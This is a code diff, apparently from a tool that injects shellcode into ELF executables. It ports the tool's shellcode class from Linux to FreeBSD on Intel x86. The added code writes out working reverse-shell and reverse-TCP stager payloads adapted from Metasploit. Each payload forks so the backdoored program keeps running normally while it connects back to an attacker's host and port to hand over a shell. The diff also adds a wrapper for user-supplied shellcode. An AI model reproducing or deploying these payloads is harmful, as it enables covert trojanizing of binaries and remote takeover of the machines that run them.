@@ -32,11 +32,12 @@ POSSIBILITY OF SUCH DAMAGE.
 '''
 
 import struct
+import sys
 
 
-class linux_elfI32_shellcode():
+class freebsd_elfI32_shellcode():
     """
-    Linux ELFIntel x32 shellcode class
+    FreeBSDELF Intel x32 shellcode class
     """
 
     def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
@@ -63,65 +64,68 @@ class linux_elfI32_shellcode():
 
     def reverse_shell_tcp(self, CavesPicked={}):
         """
-        Modified from metasploit payload/linux/x86/shell_reverse_tcp
+        Modified metasploit payload/bsd/x86/shell_reverse_tcp
         to correctly fork the shellcode payload and contiue normal execution.
         """
         if self.PORT is None:
             print ("Must provide port")
             return False
 
-        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
-        #will need to put resume execution shellcode here
+        self.shellcode1 = "\x52"        # push edx
+        self.shellcode1 += "\x31\xC0"   # xor eax, eax
+        self.shellcode1 += "\xB0\x02"   # mov al, 2
+        self.shellcode1 += "\xCD\x80"   # int 80
+        self.shellcode1 += "\x5A"       # pop edx
+        self.shellcode1 += "\x85\xc0\x74\x07"
         self.shellcode1 += "\xbd"
+        #JMP to e_entry
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
-        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-                            "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
-        #HOST
+        #BEGIN EXTERNAL SHELLCODE
+        self.shellcode1 += "\x68"
         self.shellcode1 += self.pack_ip_addresses()
-        self.shellcode1 += "\x68\x02\x00"
-        #PORT
+        self.shellcode1 += "\x68\xff\x02"
         self.shellcode1 += struct.pack('!H', self.PORT)
-        self.shellcode1 += ("\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
-                            "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
-                            "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")
-
+        self.shellcode1 += ("\x89\xe7\x31\xc0\x50"
+                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
+                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
+                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
+                            "\xb0\x3b\xcd\x80")
         self.shellcode = self.shellcode1
         return (self.shellcode1)
 
     def reverse_tcp_stager(self, CavesPicked={}):
         """
         FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
-        Modified metasploit payload/linux/x64/shell/reverse_tcp
-        to correctly fork the shellcode payload and contiue normal execution.
+        Modified from metasploit payload/bsd/x86/shell/reverse_tcp
+        to correctly fork the shellcode payload and continue normal execution.
         """
         if self.PORT is None:
             print ("Must provide port")
             return False
-
-        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
-        #will need to put resume execution shellcode here
+        #FORK SHELLCODE
+        self.shellcode1 = "\x52"        # push edx
+        self.shellcode1 += "\x31\xC0"   # xor eax, eax
+        self.shellcode1 += "\xB0\x02"   # mov al, 2
+        self.shellcode1 += "\xCD\x80"   # int 80
+        self.shellcode1 += "\x5A"       # pop edx
+        self.shellcode1 += "\x85\xc0\x74\x07"
         self.shellcode1 += "\xbd"
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
-        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
-                            "\x97\x5b\x68")
-        #HOST
+        #EXTERNAL SHELLCODE
+        self.shellcode1 += "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68"
         self.shellcode1 += self.pack_ip_addresses()
-        self.shellcode1 += "\x68\x02\x00"
-        #PORT
+        self.shellcode1 += "\xcd\x80\x68\x10\x02"
         self.shellcode1 += struct.pack('!H', self.PORT)
-        self.shellcode1 += ("\x89\xe1\x6a"
-                            "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
-                            "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
-                            "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")
-
+        self.shellcode1 += ("\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58\xcd\x80"
+                            "\xb0\x03\xc6\x41\xfd\x10\xcd\x80\xc3")
         self.shellcode = self.shellcode1
         return (self.shellcode1)
 
     def user_supplied_shellcode(self, CavesPicked={}):
         """
-        For user supplied shellcode
+        For position independent shellcode from the user
         """
         if self.SUPPLIED_SHELLCODE is None:
             print "[!] User must provide shellcode for this module (-U)"
@@ -129,7 +133,13 @@ class linux_elfI32_shellcode():
         else:
             supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
-        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
+        #FORK SHELLCODE
+        self.shellcode1 = "\x52"        # push edx
+        self.shellcode1 += "\x31\xC0"   # xor eax, eax
+        self.shellcode1 += "\xB0\x02"   # mov al, 2
+        self.shellcode1 += "\xCD\x80"   # int 80
+        self.shellcode1 += "\x5A"       # pop edx
+        self.shellcode1 += "\x85\xc0\x74\x07"
         self.shellcode1 += "\xbd"
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
